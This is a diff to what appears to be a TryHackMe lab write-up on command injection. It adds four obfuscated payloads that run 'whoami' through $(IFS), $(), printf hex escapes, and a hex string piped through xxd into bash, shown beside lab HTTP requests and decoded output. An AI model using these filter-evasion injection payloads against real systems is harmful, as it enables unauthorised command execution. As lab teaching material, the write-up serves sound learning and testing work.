@@ -67,6 +67,8 @@ There is no WAF, so our payloads reach the target server with no restrictions, h
 
 <mark>$(IFS) Empty Space</mark>
 
+who$(IFS)ami
+
 ```
 POST /import HTTP/1.1
 Host: random-tryhackme-lab-environment.com
@@ -86,6 +88,8 @@ base64 decoded whoami output: bartender
 **Obfuscation of the `whoami` command**
 
 <mark>$() Empty Space</mark>
+
+who$()ami
 
 ```
 POST /import HTTP/1.1
@@ -107,6 +111,8 @@ base64 decoded whoami output: bartender
 
 <mark>$(printf '/hex/values/for/whoami')</mark>
 
+$(printf+'\x77\x68\x6f\x61\x6d\x69')
+
 ```
 POST /import HTTP/1.1
 Host: random-tryhackme-lab-environment.com
@@ -126,6 +132,8 @@ base64 decoded whoami output: bartender
 **Obfuscation of the `whoami` command**
 
 <mark>echo 'hex-with-no-spaces' | xxd -r -p | ba$()sh</mark>
+
+echo+'77686f616d69'+|+xxd+-r+-p+|ba$()sh
 
 ```
 POST /import HTTP/1.1
